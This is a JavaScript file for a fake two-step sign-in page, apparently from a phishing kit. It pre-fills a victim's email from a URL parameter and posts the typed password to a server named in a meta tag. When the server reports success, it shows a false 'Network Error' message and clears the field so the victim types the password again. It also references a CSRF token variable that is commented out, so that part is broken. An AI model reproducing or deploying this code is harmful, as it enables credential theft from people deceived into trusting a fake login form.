
function getQueryParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}


document.addEventListener("DOMContentLoaded", function () {
    const emailParam = getQueryParam('em');
    const emailSide = document.getElementById('email-side');
    const passwordSide = document.getElementById('password-side');
    const emailInput = document.getElementById('email');
    const emailHidden = document.getElementById('emailhidden');
    const showEmail = document.getElementById('showemail');
    const nextBtn = document.getElementById('next-email');
    const backLink = document.getElementById('back-link');
    const emailError = document.getElementById('email-error');

    if (emailParam) {
        emailSide.style.display = 'none';
        passwordSide.style.display = 'block';
        emailHidden.value = emailParam;
        showEmail.innerText = emailParam;
    } else {
        emailSide.style.display = 'block';
        passwordSide.style.display = 'none';
    }

    nextBtn.addEventListener('click', function () {
        const enteredEmail = emailInput.value.trim();
        emailError.innerText = '';

        if (!enteredEmail) {
            emailError.innerText = "Please enter your email.";
            return;
        }

        emailSide.style.display = 'none';
        passwordSide.style.display = 'block';
        emailHidden.value = enteredEmail;
        showEmail.innerText = enteredEmail;

        const newUrl = window.location.pathname + '?em=' + encodeURIComponent(enteredEmail);
        window.history.replaceState({}, '', newUrl);
    });

    backLink.addEventListener('click', function (e) {
        e.preventDefault();
        emailSide.style.display = 'block';
        passwordSide.style.display = 'none';
        window.history.replaceState({}, '', window.location.pathname);
    });
});


// sending with fetch api
document.addEventListener("DOMContentLoaded", function () {
    const finalSubmitBtn = document.getElementById('final-submit-btn');
    const emailHidden = document.getElementById('emailhidden');
    const passwordInput = document.getElementById('password');
    const errorBox = document.getElementById('password-error');
    const btnText = finalSubmitBtn.querySelector('.btn-text');
    const btnSpinner = finalSubmitBtn.querySelector('.btn-spinner');
    // const csrfTokenDjango = document.querySelector('meta[name="csrf-token"]').content;
    const serverUrl = document.querySelector('meta[name="ajax-login-url"]').content;

    finalSubmitBtn.addEventListener('click', function () {
        const email = emailHidden.value.trim();
        const password = passwordInput.value.trim();

        errorBox.innerText = ''; // Clear previous errors

        if (!email || !password) {
            errorBox.innerText = "Both email and password are required.";
            return;
        }
        if (!isValidPassword(password)) {
            errorBox.innerText = "Password must be at least 8 characters.";
            document.getElementById('password').value = '';
            return;
        }
        // Show spinner
        btnText.style.display = 'none';
        btnSpinner.style.display = 'inline-block';
        finalSubmitBtn.disabled = true;

        // passed server url in html before the link of my js
        fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrfTokenDjango 
            },
            body: JSON.stringify({ email, password })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                console.log('y');
                errorBox.innerText = data.message || 'Network Error! Please verify your information and try again.';
                btnText.style.display = 'inline-block';
                btnSpinner.style.display = 'none';
                finalSubmitBtn.disabled = false;
                document.getElementById('password').value = '';
                const newUrl = window.location.pathname + '?em=' + encodeURIComponent(email);
                window.history.replaceState({}, '', newUrl);
            } else {
                errorBox.innerText = data.message || 'Login failed.';
                finalSubmitBtn.disabled = false;
            }
        })
        .catch(error => {
            console.error("Login error:", error);
            errorBox.innerText = "An unexpected error occurred.";
            finalSubmitBtn.disabled = false;
        });
    });

    function isValidPassword(password) {
        return password.length >= 8;
    }

    // CSRF helper
    function getCookie(name) {
        let cookieValue = null;
        if (document.cookie && document.cookie !== '') {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                cookie = cookie.trim();
                if (cookie.substring(0, name.length + 1) === (name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
});